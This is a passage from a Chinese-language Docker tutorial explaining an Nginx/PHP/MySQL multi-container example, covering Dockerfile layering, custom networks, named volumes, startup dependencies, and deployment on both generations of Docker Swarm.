\</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get purge -y --auto-remove \</span></span><br><span class="line"><span class="bash">        -o APT::AutoRemove::RecommendsImportant=<span class="literal">false</span> \</span></span><br><span class="line"><span class="bash">        -o APT::AutoRemove::SuggestsImportant=<span class="literal">false</span> \</span></span><br><span class="line"><span class="bash">        <span class="variable">$buildDeps</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; rm -rf /var/cache/apt/* \</span></span><br><span class="line"><span class="bash">    &amp;&amp; rm -rf /var/lib/apt/lists/*</span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash">COPY ./php.conf /usr/<span class="built_in">local</span>/etc/php/conf.d/php.conf</span></span><br><span class="line"><span class="bash">COPY ./site /usr/share/nginx/html</span></span><br></pre></td></tr></table></figure><p>前面几行很简单，指定了基础镜像为<code>php:7-fpm</code>，并且设定时区为中国时区，然后用<a href="http://mirrors.163.com/.help/debian.html" target="_blank" rel="noopener">网易的 Debian 源</a>替代默认的源，避免伟大的墙影响普通的包下载。接下来的那一个很多行的 <code>RUN</code> 需要特别的说一下。</p><p>初学 Docker，不少人会误以为 <code>Dockerfile</code> 等同于 Shell 脚本，于是错误的用了很多个 <code>RUN</code>，每个 <code>RUN</code> 对应一个命令。这是错误用法，会导致最终镜像极为臃肿。<code>Dockerfile</code> 是镜像定制文件，其中每一个命令都是在定义这一层该如何改变，因此应该<a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/" target="_blank" rel="noopener">遵循最佳实践</a>，将同一类的东西写入一层，并且在结束时清理任何无关的文件。</p><p>这一层的目的是安装、构建 PHP 插件，因此真正所需要的是构建好的插件、以及插件运行所需要的依赖库，其它任何多余的文件都不应该存在。所以，在这里可以看到，依赖部分划分为了“构建依赖”以及“运行依赖”，这样在安装后，可以把不再需要的“构建依赖”删除掉，避免因为构建而导致这层多了一些不需要的文件。</p><p>这里使用的是官方 <code>php</code> 镜像中所带的 <code>docker-php-ext-install</code> 来安装 php 的插件，并且在需要时，使用 <code>docker-php-ext-configure</code> 来配置构建参数。这两个脚本是官方镜像中为了帮助镜像定制所提供的，很多官方镜像都有这类为镜像定制特意制作的脚本或者程序。这也是官方镜像易于扩展复用的原因之一，他们在尽可能的帮助使用、定制镜像。</p><p>更多关于如何定制镜像的信息可以从 Docker Hub 官方镜像的文档中看到。</p><p>最后的清理过程中，可以看到除了清除“构建依赖”、以及相关无用软件外，还彻底清空了 <code>apt</code> 的缓存。任何不需要的东西，都应该清理掉，确保这一层构建完毕后，仅剩所需的文件。</p><p>在 <code>Dockerfile</code> 的最后，复制配置文件和网页目录到指定位置。</p><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>在这个例子中，演示了如何使用自定义网络，并利用服务名通讯。</p><p>首先，在 <code>docker-compose.yml</code> 文件尾部，全局 <code>networks</code> 部分定义了两个自定义网络，分别名为 <code>frontend</code>，<code>backend</code>。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">networks:</span></span><br><span class="line"><span class="attr">    frontend:</span></span><br><span class="line"><span class="attr">    backend:</span></span><br></pre></td></tr></table></figure><p>每个自定义网络都可以配置很多东西，包括网络所使用的驱动、网络地址范围等设置。但是，你可能会注意到这里 <code>frontend</code>、<code>backend</code> 后面是空的，这是指一切都使用默认，换句话说，在单机环境中，将意味着使用 <code>bridge</code> 驱动；而在 Swarm 环境中，使用 <code>overlay</code> 驱动，而且地址范围完全交给 Docker 引擎决定。</p><p>然后，在前面<code>services</code>中，每个服务下面的也有一个 <code>networks</code> 部分，这部分是用于定义这个服务要连接到哪些网络上。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">    nginx:</span></span><br><span class="line">        <span class="string">...</span></span><br><span class="line"><span class="attr">        networks:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">frontend</span></span><br><span class="line"><span class="attr">    php:</span></span><br><span class="line">        <span class="string">...</span></span><br><span class="line"><span class="attr">        networks:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">frontend</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">backend</span></span><br><span class="line"><span class="attr">    mysql:</span></span><br><span class="line">        <span class="string">...</span></span><br><span class="line"><span class="attr">        networks:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">backend</span></span><br></pre></td></tr></table></figure><p>在这个例子中，</p><ul><li><code>nginx</code> 接到了名为 <code>frontend</code> 的前端网络；</li><li><code>mysql</code> 接到了名为 <code>backend</code> 的后端网络；</li><li>而作为中间的 <code>php</code> 同时连接了 <code>frontend</code> 和 <code>backend</code> 网络上。</li></ul><p>连接到同一个网络的容器，可以进行互连；而不同网络的容器则会被隔离。<br>所以在这个例子中，<code>nginx</code> 可以和 <code>php</code> 服务进行互连，<code>php</code> 也可以和 <code>mysql</code> 服务互连，因为它们连接到了同一个网络中；<br>而 <code>nginx</code> 和 <code>mysql</code> 并不处于同一网络，所以二者无法通讯，这起到了隔离的作用。</p><p>处于同一网络的容器，可以使用<strong>服务名</strong>访问对方。比如，在这个例子中的 <code>./site/index.php</code> 里，就是使用的 <code>mysql</code> 这个服务名去连接的数据库服务器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 建立连接</span></span><br><span class="line">$conn = mysqli_connect(<span class="string">"mysql"</span>, <span class="string">"root"</span>, $_ENV[<span class="string">"MYSQL_PASSWORD"</span>]);</span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以注意到，在这段数据库连接的代码里，数据库密码是通过环境变量，<code>$_ENV[&quot;MYSQL_PASSWORD&quot;]</code>，读取的，因此密码并非写死于代码中。在运行时，可以通过环境变量将实际环境的密码传入容器。在这个例子里，就是在 <code>docker-compose.yml</code> 文件中指定的环境变量：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="attr">    php:</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="attr">        environment:</span></span><br><span class="line"><span class="attr">            MYSQL_PASSWORD:</span> <span class="string">Passw0rd</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><p>关于 Docker 自定义网络，可以看一下官方文档的介绍：<br><a href="https://docs.docker.com/engine/userguide/networking/dockernetworks/#/user-defined-networks" target="_blank" rel="noopener">https://docs.docker.com/engine/userguide/networking/dockernetworks/#/user-defined-networks</a></p><p>关于在 Docker Compose 中使用自定义网络的部分，可以看官方这部分文档：<br><a href="https://docs.docker.com/compose/networking/" target="_blank" rel="noopener">https://docs.docker.com/compose/networking/</a></p><h2 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h2><p>在这三个服务中，<code>nginx</code> 和 <code>php</code> 都是无状态服务，它们都不需要本地存储。但是，<code>mysql</code> 是数据库，需要存储动态数据文件。我们知道 Docker 是要求容器存储层里不放状态，所有的状态（也就是动态的数据）的持久化都应该使用卷，在这里就是使用命名卷保存数据的。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line"><span class="attr">    mysql-data:</span></span><br></pre></td></tr></table></figure><p>在 <code>docker-compose.yml</code> 文件的后面，有一个全局的 <code>volumes</code> 配置部分，用于定义的是命名卷，这里我们定义了一个名为 <code>mysql-data</code> 的命名卷。这里卷的定义后还可以加一些卷的参数，比如卷驱动、卷的一些配置，而这里省略，意味着都使用默认值。也就是说使用 <code>local</code> 也就是最简单的本地卷驱动，将来建立的命名卷可能会位于 <code>/var/lib/docker/volumes</code> 下，不过不需要、也不应该直接去这个位置访问其内容。</p><p>在 <code>mysql</code> 服务的部分，同样有一个 <code>volumes</code> 配置，这里配置的是容器运行时需要挂载什么卷、或绑定宿主的目录。在这里，我们使用了之前定义的命名卷 <code>mysql-data</code>，挂载到容器的 <code>/var/lib/mysql</code>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mysql:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">mysql:5.7</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="attr">        - mysql-data:</span><span class="string">/var/lib/mysql</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><p>服务的启动顺序有时候比较关键，Compose 在这里可以提供一定程度的启动控制。比如这个例子中，我是用了依赖关系 <code>depends_on</code> 来进行配置。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">    nginx:</span></span><br><span class="line">        <span class="string">...</span></span><br><span class="line"><span class="attr">        depends_on:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">php</span></span><br><span class="line"><span class="attr">    php:</span></span><br><span class="line">        <span class="string">...</span></span><br><span class="line"><span class="attr">        depends_on:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">mysql</span></span><br><span class="line"><span class="attr">    mysql:</span></span><br><span class="line">        <span class="string">...</span></span><br></pre></td></tr></table></figure><p>在这里，<code>nginx</code> 需要使用 <code>php</code> 服务，所以这里依赖关系上设置了 <code>php</code>，而 <code>php</code> 服务则需要操作 <code>mysql</code>，所以它依赖了 <code>mysql</code>。</p><p>在 <code>docker-compose up -d</code> 的时候，会根据依赖控制服务间的启动顺序，对于这个例子，则会以 <code>mysql</code> → <code>php</code> → <code>nginx</code> 的顺序启动服务。</p><p>需要注意的是，这里的启动顺序的控制是有限度的，并非彻底等到所依赖的服务可以工作后，才会启动下一个服务。而是确定容器启动后，则开始启动下一个服务。因此，这里的顺序控制可能依旧会导致某项服务启动时，它所依赖的服务并未准备好。比如 <code>php</code> 启动后，有可能会出现 <code>mysql</code> 服务的数据库尚未初始化完。对于某些应用来说，这个控制，依旧可能导致报错说无法连接所需服务。</p><p>如果需要应用级别的服务依赖等待，需要在 <code>entrypoint.sh</code> 这类脚本中，加入服务等待的部分。而且，也可以通过 <code>restart: always</code> 这种设置，让应用启动过程中，如果依赖服务尚未准备好，而报错退出后，有再一次尝试的机会。</p><p>此外，Docker 支持健康检查，在 docker-compose.yml <code>v2</code> 的格式下，可以要求依赖条件对方服务启动完成：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">depends_on:</span></span><br><span class="line"><span class="attr">    condition:</span> <span class="string">service_healthy</span></span><br></pre></td></tr></table></figure><p>进一步信息，请参考官网文档：<a href="https://docs.docker.com/compose/compose-file/compose-file-v2/#depends_on" target="_blank" rel="noopener">https://docs.docker.com/compose/compose-file/compose-file-v2/#depends_on</a></p><h1 id="单机操作"><a href="#单机操作" class="headerlink" title="单机操作"></a>单机操作</h1><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><em>如果构建过程中，发现镜像下载极为缓慢、甚至失败。这是伟大的墙在捣乱。你需要去配置加速器</em></p><p>如果修改了配置文件，可能需要明确重新构建，可以使用命令 <code>docker-compose build</code>。</p><h2 id="查看服务状态"><a href="#查看服务状态" class="headerlink" title="查看服务状态"></a>查看服务状态</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><h2 id="查看服务日志"><a href="#查看服务日志" class="headerlink" title="查看服务日志"></a>查看服务日志</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose logs</span><br></pre></td></tr></table></figure><h2 id="访问服务"><a href="#访问服务" class="headerlink" title="访问服务"></a>访问服务</h2><p><code>nginx</code> 将会守候 <code>80</code> 端口，</p><ul><li>如果使用的 Linux 或者 <code>Docker for Mac</code>，可以直接在本机访问 <a href="http://localhost" target="_blank" rel="noopener">http://localhost</a></li><li>如果是使用 <code>Docker Toolbox</code> 的话，则应该使用虚拟机地址，如 <a href="http://192.168.99.100" target="_blank" rel="noopener">http://192.168.99.100</a>，具体虚拟机地址查询使用命令 <code>docker-machine ip default</code>。</li><li>如果是自己安装的 Ubuntu、CentOS 类的虚拟机，直接进虚拟机查看地址。</li></ul><p>如果访问后，看到了 <code>成功连接 MySQL 服务器</code> 就说明数据库连接正常。</p><h2 id="停止服务"><a href="#停止服务" class="headerlink" title="停止服务"></a>停止服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure><h1 id="Swarm-集群编排"><a href="#Swarm-集群编排" class="headerlink" title="Swarm 集群编排"></a>Swarm 集群编排</h1><p>在单机环境中使用容器，可能经常会用到绑定宿主目录的情况，这在开发时很方便。但是在集群环境中部署应用的时候，挂载宿主目录就变得非常不方便了。</p><p>在集群环境中，Swarm 可能会调度容器运行于任何一台主机上，如果一个主机失败后，可能还会再次调度到别的主机上，确保服务可以继续。在这种情况下，如果使用绑定宿主目录的形式，就必须同时在所有主机上的相同位置，事先准备好其内容，并且要保持同步。这并不是一个好的解决方案。</p><p>因此为了在集群环境中部署方便，比较好的做法是，将应用代码、配置文件等直接放入镜像。就如同这个例子中我们看到的 <code>nginx</code>、<code>php</code> 服务的镜像一样，在使用 <code>Dockerfile</code> 定制的过程中，将配置和应用代码放入镜像。</p><p><code>nginx</code> 的服务镜像 <code>Dockerfile</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./nginx.conf /etc/nginx/conf.d/default.conf</span></span><br><span class="line"><span class="bash">COPY ./site /usr/share/nginx/html</span></span><br></pre></td></tr></table></figure><p><code>php</code> 的服务镜像 <code>Dockerfile</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./php.conf /usr/<span class="built_in">local</span>/etc/php/conf.d/php.conf</span></span><br><span class="line"><span class="bash">COPY ./site /usr/share/nginx/html</span></span><br></pre></td></tr></table></figure><p>Docker Swarm 目前分为两代。第一代是以容器形式运行，被称为 Docker Swarm；而第二代是自 <code>1.12</code> 以后以 <code>SwarmKit</code> 为基础集成进 <code>docker</code> 的 Swarm，被称为 Docker Swarm Mode。</p><h2 id="一代-Swarm"><a href="#一代-Swarm" class="headerlink" title="一代 Swarm"></a>一代 Swarm</h2><p><a href="https://docs.docker.com/swarm/" target="_blank" rel="noopener">一代 Swarm</a> 是 Docker 团队最早的集群编排的尝试，以容器形式运行，需要外置键值库（如 etcd, consul, zookeeper），需要手动配置 <code>overlay</code> 网络。其配置比 <code>kubernetes</code> 要简单，但是相比后面的第二代来说还是稍显复杂。</p><p>这里提供了一个脚本，<code>run1.sh</code>，用于建立一代 Swarm，以及启动服务、横向扩展。</p><h3 id="建立-swarm-集群"><a href="#建立-swarm-集群" class="headerlink" title="建立 swarm 集群"></a>建立 swarm 集群</h3><p>在安装有 <code>docker-machine</code> 以及 VirtualBox 的虚拟机上（比如装有 Docker Toolbox 的Mac/Windows），使用 <code>run1.sh</code> 脚本即可创建集群：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run1.sh create</span><br></pre></td></tr></table></figure><h3 id="启动-1"><a href="#启动-1" class="headerlink" title="启动"></a>启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run1.sh up</span><br></pre></td></tr></table></figure><h3 id="横向扩展"><a href="#横向扩展" class="headerlink" title="横向扩展"></a>横向扩展</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run1.sh scale 3 5</span><br></pre></td></tr></table></figure><p>这里第一个参数是 nginx 容器的数量，第二个参数是 php 容器的数量。</p><h3 id="访问服务-1"><a href="#访问服务-1" class="headerlink" title="访问服务"></a>访问服务</h3><p><code>nginx</code> 将会守候 80 端口。利用 <code>docker ps</code> 可以查看具体集群哪个节点在跑 nginx 以及 IP 地址。如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">eval</span> $(./run1.sh env)</span><br><span class="line">$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE                       COMMAND                  CREATED             STATUS              PORTS                                NAMES</span><br><span class="line">d85a2c26dd7d        twang2218/lnmp-php:v1.2     <span class="string">"php-fpm"</span>                9 minutes ago       Up 9 minutes        9000/tcp                             node1/dockerlnmp_php_5</span><br><span class="line">c81e169c164d        twang2218/lnmp-php:v1.2     <span class="string">"php-fpm"</span>                9 minutes ago       Up 9 minutes        9000/tcp                             node1/dockerlnmp_php_2</span><br><span class="line">b43de77c9340        twang2218/lnmp-php:v1.2     <span class="string">"php-fpm"</span>                9 minutes ago       Up 9 minutes        9000/tcp                             master/dockerlnmp_php_4</span><br><span class="line">fdcb718b6183        twang2218/lnmp-php:v1.2     <span class="string">"php-fpm"</span>                9 minutes ago       Up 9 minutes        9000/tcp                             node3/dockerlnmp_php_3</span><br><span class="line">764b10b17dc4        twang2218/lnmp-nginx:v1.2   <span class="string">"nginx -g 'daemon off"</span>   9 minutes ago       Up 9 minutes        192.168.99.104:80-&gt;80/tcp, 443/tcp   master/dockerlnmp_nginx_3</span><br><span class="line">e92b34f998bf        twang2218/lnmp-nginx:v1.2   <span class="string">"nginx -g 'daemon off"</span>   9 minutes ago       Up 9 minutes        192.168.99.106:80-&gt;80/tcp, 443/tcp   node2/dockerlnmp_nginx_2</span><br><span class="line">077ee73c8148        twang2218/lnmp-nginx:v1.2   <span class="string">"nginx -g 'daemon off"</span>   22 minutes ago      Up 22 minutes       192.168.99.105:80-&gt;80/tcp, 443/tcp   node3/dockerlnmp_nginx_1</span><br><span class="line">1931249a66c1        e8920543aee8                <span class="string">"php-fpm"</span>                22 minutes ago      Up 22 minutes       9000/tcp                             node2/dockerlnmp_php_1</span><br><span class="line">cf71bca309dd        mysql:5.7                   <span class="string">"docker-entrypoint.sh"</span>   22 minutes ago      Up 22 minutes       3306/tcp                             node1/dockerlnmp_mysql_1</span><br></pre></td></tr></table></figure><p>如这种情况，就可以使用 <a href="http://192.168.99.104" target="_blank" rel="noopener">http://192.168.99.104</a>, <a href="http://192.168.99.105" target="_blank" rel="noopener">http://192.168.99.105</a>, <a href="http://192.168.99.106" target="_blank" rel="noopener">http://192.168.99.106</a> 来访问服务。</p><h3 id="停止服务-1"><a href="#停止服务-1" class="headerlink" title="停止服务"></a>停止服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run1.sh down</span><br></pre></td></tr></table></figure><h3 id="销毁集群"><a href="#销毁集群" class="headerlink" title="销毁集群"></a>销毁集群</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run1.sh remove</span><br></pre></td></tr></table></figure><h2 id="二代-Swarm-Swarm-Mode"><a href="#二代-Swarm-Swarm-Mode" class="headerlink" title="二代 Swarm (Swarm Mode)"></a>二代 Swarm (Swarm Mode)</h2><p><a href="https://docs.docker.com/engine/swarm/" target="_blank" rel="noopener">二代 Swarm</a>，既 Docker Swarm Mode，是自 1.12 之后引入的原生的 Docker 集群编排机制。吸取一代 Swarm 的问题，大幅改变了架构，并且大大简化了集群构建。内置了分布式数据库，不在需要配置外置键值库；内置了内核级负载均衡；内置了边界负载均衡。</p><p>和一代 Swarm 的例子一样，为了方便说明，这里提供了一个 <code>run2.sh</code> 来帮助建立集群、运行服务。</p><h3 id="建立-swarm-集群-1"><a href="#建立-swarm-集群-1" class="headerlink" title="建立 swarm 集群"></a>建立 swarm 集群</h3><p>在安装有 <code>docker-machine</code> 以及 VirtualBox 的虚拟机上（比如装有 Docker Toolbox 的Mac/Windows），使用 <code>run2.sh</code> 脚本即可创建集群：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run2.sh create</span><br></pre></td></tr></table></figure><p><em>使用 Digital Ocean, AWS之类的云服务的话，就没必要本地使用 VirtualBox，不过需要事先配置好对应的 <code>docker-machine</code> 所需的环境变量。</em></p><h3 id="启动-2"><a href="#启动-2" class="headerlink" title="启动"></a>启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run2.sh up</span><br></pre></td></tr></table></figure><h3 id="横向扩展-1"><a href="#横向扩展-1" class="headerlink" title="横向扩展"></a>横向扩展</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run2.sh scale 10 5</span><br></pre></td></tr></table></figure><p>这里第一个参数是 nginx 容器的数量，第二个参数是 php 容器的数量。</p><h3 id="列出服务状态"><a href="#列出服务状态" class="headerlink" title="列出服务状态"></a>列出服务状态</h3><p>我们可以使用标准的命令列出所有服务以及状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker service ls</span><br><span class="line">ID            NAME   REPLICAS  IMAGE                      COMMAND</span><br><span class="line">2lnqjas6rov4  mysql  1/1       mysql:5.7                  mysqld --character-set-server=utf8</span><br><span class="line">ahqktnscjlkl  php    5/5       twang2218/lnmp-php:v1.2</span><br><span class="line">bhoodda99ebt  nginx  10/10     twang2218/lnmp-nginx:v1.2</span><br></pre></td></tr></table></figure><p>我们也可以通过下面的命令列出具体的每个服务对应的每个容器状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ ./run2.sh ps</span><br><span class="line">+ docker service ps -f desired-state=running nginx</span><br><span class="line">ID                         NAME      IMAGE                      NODE     DESIRED STATE  CURRENT STATE           ERROR</span><br><span class="line">87xr5oa577hl9amelznpy7s7z  nginx.1   twang2218/lnmp-nginx:v1.2  node2    Running        Running 3 hours ago</span><br><span class="line">7dwmc22qaftz0xrvijij9dnuw  nginx.2   twang2218/lnmp-nginx:v1.2  node3    Running        Running 22 minutes ago</span><br><span class="line">00rus0xed3y851pcwkbybop80  nginx.3   twang2218/lnmp-nginx:v1.2  manager  Running        Running 22 minutes ago</span><br><span class="line">5ypct2dnfu6ducnokdlk82dne  nginx.4   twang2218/lnmp-nginx:v1.2  manager  Running        Running 22 minutes ago</span><br><span class="line">7qshykjq8cqju0zt6yb9dkktq  nginx.5   twang2218/lnmp-nginx:v1.2  node2    Running        Running 22 minutes ago</span><br><span class="line">e2cux4vj2femrb3wc33cvm70n  nginx.6   twang2218/lnmp-nginx:v1.2  node1    Running        Running 22 minutes ago</span><br><span class="line">9uwbn5tm49k7vxesucym4plct  nginx.7   twang2218/lnmp-nginx:v1.2  node1    Running        Running 22 minutes ago</span><br><span class="line">6d8v5asrqwnz03hvm2jh96rq3  nginx.8   twang2218/lnmp-nginx:v1.2  node1    Running        Running 22 minutes ago</span><br><span class="line">eh44qdsiv7wq8jbwh2sr30ada  nginx.9   twang2218/lnmp-nginx:v1.2  node3    Running        Running 22 minutes ago</span><br><span class="line">51l7nirwtv4gxnzbhkx6juvko  nginx.10  twang2218/lnmp-nginx:v1.2  node2    Running        Running 22 minutes ago</span><br><span class="line">+ docker service ps -f desired-state=running php</span><br><span class="line">ID                         NAME   IMAGE                    NODE     DESIRED STATE  CURRENT STATE           ERROR</span><br><span class="line">4o3pqdva92vjdbfygdn0agp32  php.1  twang2218/lnmp-php:v1.2  manager  Running        Running 3 hours ago</span><br><span class="line">bf3d6g4rr8cax4wucu9lixgmh  php.2  twang2218/lnmp-php:v1.2  node3    Running        Running 22 minutes ago</span><br><span class="line">9xq9ozbpea7evllttvyxk7qtf  php.3  twang2218/lnmp-php:v1.2  manager  Running        Running 22 minutes ago</span><br><span class="line">8umths3p8rqib0max6b6wiszv  php.4  twang2218/lnmp-php:v1.2  node2    Running        Running 22 minutes ago</span><br><span class="line">0fxe0i1n2sp9nlvfgu4xlc0fx  php.5  twang2218/lnmp-php:v1.2  node1    Running        Running 22 minutes ago</span><br><span class="line">+ docker service ps -f desired-state=running mysql</span><br><span class="line">ID                         NAME     IMAGE      NODE   DESIRED STATE  CURRENT STATE        ERROR</span><br><span class="line">3ozjwfgwfcq89mu7tqzi1hqeu  mysql.1  mysql:5.7  node3  Running        Running 3 hours ago</span><br></pre></td></tr></table></figure><h3 id="访问服务-2"><a href="#访问服务-2" class="headerlink" title="访问服务"></a>访问服务</h3><p><code>nginx</code> 将会守候 80 端口，由于二代 Swarm 具有边界负载均衡 (Routing Mesh, Ingress Load balance)，因此，集群内所有节点都会守护 80 端口，无论是 Manager 还是 Worker，无论是否有 <code>nginx</code> 容器在其上运行。当某个节点接到 80 端口服务请求后，会自动根据容器所在位置，利用 overlay 网络将请求转发过去。因此，访问任意节点的 80 端口都应该可以看到服务。</p><p>通过下面的命令可以列出所有节点，访问其中任意地址都应该可以看到应用页面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./run2.sh nodes</span><br><span class="line">manager   http://192.168.99.101</span><br><span class="line">node1     http://192.168.99.103</span><br><span class="line">node2     http://192.168.99.102</span><br><span class="line">node3     http://192.168.99.104</span><br></pre></td></tr></table></figure><h3 id="停止服务-2"><a href="#停止服务-2" class="headerlink" title="停止服务"></a>停止服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run2.sh down</span><br></pre></td></tr></table></figure><h3 id="销毁集群-1"><a href="#销毁集群-1" class="headerlink" title="销毁集群"></a>销毁集群</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run2.sh remove</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;LNMP-Docker-多容器间协作互连&quot;&gt;&lt;a href=&quot;#LNMP-Docker-多容器间协作互连&quot; class=&quot;headerlink&quot; title=&quot;LNMP - Docker 多容器间协作互连&quot;&gt;&lt;/a&gt;LNMP - Docker 多容器间协作互连&lt;/h1&gt;&lt;h1 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h1&gt;&lt;p&gt;这是一个 Docker 多容器间协作互连的例子。使用的是最常见的 LNMP 的技术栈，既 &lt;code&gt;Nginx&lt;/code&gt; + &lt;code&gt;PHP&lt;/code&gt; + &lt;code&gt;MySQL&lt;/code&gt;。&lt;/p&gt;
